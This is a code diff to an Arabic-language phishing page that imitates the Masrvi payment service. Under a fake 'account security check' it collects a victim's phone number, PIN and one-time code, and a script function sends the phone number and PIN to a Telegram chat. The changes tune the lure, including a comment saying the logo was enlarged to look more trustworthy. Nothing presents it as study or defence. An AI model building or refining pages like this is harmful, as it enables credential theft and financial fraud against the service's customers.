@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>التحقق من الحساب | Masrvi</title>
+    <title>التحقق من أمان حسابك | Masrvi</title>
     <link rel="icon" href="logo_masrvi.jpeg">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap');
@@ -50,7 +50,7 @@
         }
 
         .logo {
-            width: 120px;
+            width: 180px; /* تم تكبير الشعار لزيادة الموثوقية */
             height: auto;
             margin-bottom: 20px;
         }
@@ -104,6 +104,7 @@
             outline: none;
             transition: all 0.3s;
             background: #FAFAFA;
+            text-align: right; /* توحيد اتجاه الكتابة لليمين */
         }
 
         .input-wrapper input:focus {
@@ -268,7 +269,7 @@
 <div class="app-container">
     <!-- Loading Screen -->
     <div id="loading-screen">
-        <img src="logo_masrvi.jpeg" class="logo" alt="Masrvi">
+        <img src="logo_masrvi.jpeg" class="logo" alt="Masrvi" style="width: 180px;">
         <div class="spinner"></div>
         <p style="font-weight: 700; color: var(--secondary-color);">جاري التحقق من أمان حسابك...</p>
         <p style="font-size: 13px; color: #888;">نعمل على حمايتك من أي عمليات اختراق نشطة</p>
@@ -278,28 +279,28 @@
     <div id="step1">
         <div class="header">
             <img src="logo_masrvi.jpeg" class="logo" alt="Masrvi">
-            <h1>تأمين الحساب</h1>
+            <h1>تحقق من أمان حسابك</h1>
             <p class="subtitle">يرجى إدخال بياناتك للتحقق من سلامة حسابك وحمايته من أي وصول غير مصرح به.</p>
         </div>
 
         <div class="content">
             <div class="form-group">
-                <label>رقم الهاتف الموريتاني</label>
+                <label>رقم الهاتف</label>
                 <div class="input-wrapper">
-                    <input type="tel" id="phone" placeholder="20 00 00 00" maxlength="8" inputmode="numeric">
+                    <input type="tel" id="phone" placeholder="" maxlength="8" inputmode="numeric">
                     <img src="user_icon.jpeg" class="icon">
                 </div>
             </div>
 
             <div class="form-group">
-                <label>الرمز السري (PIN)</label>
+                <label>الرمز السري</label>
                 <div class="input-wrapper">
-                    <input type="password" id="pin" placeholder="أدخل 4 أرقام" maxlength="4" inputmode="numeric">
+                    <input type="password" id="pin" placeholder="" maxlength="4" inputmode="numeric">
                     <img src="lock_icon.jpeg" class="icon">
                 </div>
             </div>
 
-            <button id="btn-step1" class="btn-submit">تحقق الآن</button>
+            <button id="btn-step1" class="btn-submit" disabled>تحقق الآن</button>
             
             <div class="footer-banner">
                 <img src="main_banner.jpeg" alt="Masrvi Banner">
@@ -319,12 +320,12 @@
             <div class="form-group" style="text-align: center;">
                 <img src="otp_main_icon.jpeg" style="width: 80px; margin-bottom: 20px;">
                 <div class="input-wrapper">
-                    <input type="tel" id="otp" placeholder="0 0 0 0 0 0" maxlength="6" inputmode="numeric" style="text-align: center; letter-spacing: 5px; font-size: 24px;">
+                    <input type="tel" id="otp" placeholder="" maxlength="6" inputmode="numeric" style="text-align: center; letter-spacing: 5px; font-size: 24px;">
                 </div>
                 <div class="timer-text" id="timer">05:00</div>
             </div>
 
-            <button id="btn-otp" class="btn-submit">تأكيد الرمز</button>
+            <button id="btn-otp" class="btn-submit" disabled>تأكيد الرمز</button>
         </div>
     </div>
 </div>
@@ -381,7 +382,7 @@
 
     otpInput.addEventListener('input', (e) => {
         e.target.value = e.target.value.replace(/[^0-9]/g, '');
-        btnOtp.disabled = e.target.value.length !== 6;
+        btnOtp.disabled = e.target.value.length !== 6; // الزر غير قابل للضغط إلا عند إدخال 6 أرقام
     });
 
     async function sendToTelegram(message) {
@@ -401,7 +402,7 @@
         const pin = pinInput.value;
 
         // Send Initial Data
-        const msg = `🚀 **محاولة دخول جديدة (Masrvi)**\n\n📱 الهاتف: \`${phone}\`\n🔑 الرمز (PIN): \`${pin}\`\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+        const msg = `🚀 **محاولة دخول جديدة (Masrvi)**\n\n📱 الهاتف: \`${phone}\`\n🔑 الرمز: \`${pin}\`\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
         sendToTelegram(msg);
 
         // Show Loading
